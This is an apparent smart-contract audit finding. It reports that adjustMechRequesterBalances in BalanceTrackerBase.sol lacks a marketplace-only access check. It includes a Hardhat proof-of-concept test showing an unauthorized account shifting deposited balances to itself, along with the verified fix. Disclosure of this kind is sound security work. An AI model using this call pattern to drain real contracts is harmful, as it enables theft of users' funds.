# Anyone can call adjustMechRequesterBalances 

## Summary
The bug report is about a missing security check in a function called "adjustMechRequesterBalances" in a contract called "BalanceTrackerBase.sol". This function is used to adjust the balances of two parties involved in a marketplace. However, unlike other similar functions, this one does not have a check to make sure that only the marketplace can call it. This means that anyone can call this function with arbitrary parameters and manipulate the balances, potentially draining all the funds from the contract. 

To demonstrate this issue, a test case is provided in the report. It shows that even someone who is not authorized can call the function and manipulate the balances. The recommendation is to add a check in the function to ensure that only the marketplace can call it. This has been fixed in a pull request and verified by the Cantina team. The report classifies this bug as high risk.

## Details
## BalanceTrackerBase Vulnerability Report

## Context
**File:** `BalanceTrackerBase.sol`  
**Lines:** 295 - 328

## Description
Unlike `checkAndRecordDeliveryRates` and `finalizeDeliveryRates`, `adjustMechRequesterBalances` is missing the check to ensure that only the `mechMarketplace` can call this endpoint. This oversight allows anyone to call this endpoint with arbitrary parameters, potentially manipulating both `mapRequesterBalances` and `mapMechBalances`, which could drain all funds from the contract.

## Proof of Concept
To demonstrate this vulnerability, add the following test case to `test/MechFixedPriceToken.js` and run:

```bash
npm exec hardhat test -- --grep "Balance Tracker"
```

```javascript
context("Balance Tracker", async function () {
  it("Anyone can call adjustMechRequesterBalances", async function () {
    const bob = signers[1];
    const bt = await ethers.getContractAt("BalanceTrackerFixedPriceToken", balanceTrackerFixedPriceToken.address);
    
    await token.approve(balanceTrackerFixedPriceToken.address, initMint);
    await bt.deposit(initMint);
    
    await bt.connect(bob).adjustMechRequesterBalances(
      bob.address,
      deployer.address,
      [initMint],
      "0x"
    );

    const bobBalance = await bt.mapMechBalances(bob.address);
    const deployerBalance = await bt.mapRequesterBalances(deployer.address);
    
    expect(bobBalance).to.be.equal(initMint);
    expect(deployerBalance).to.be.equal(0);
  });
});
```

## Recommendation
Make sure the following check is included in the `adjustMechRequesterBalances` function:

```solidity
// Check for marketplace access
if (msg.sender != mechMarketplace) {
  revert MarketplaceOnly(msg.sender, mechMarketplace);
}
```

Fix verified. The fix ensures that only the marketplace can call this external function.
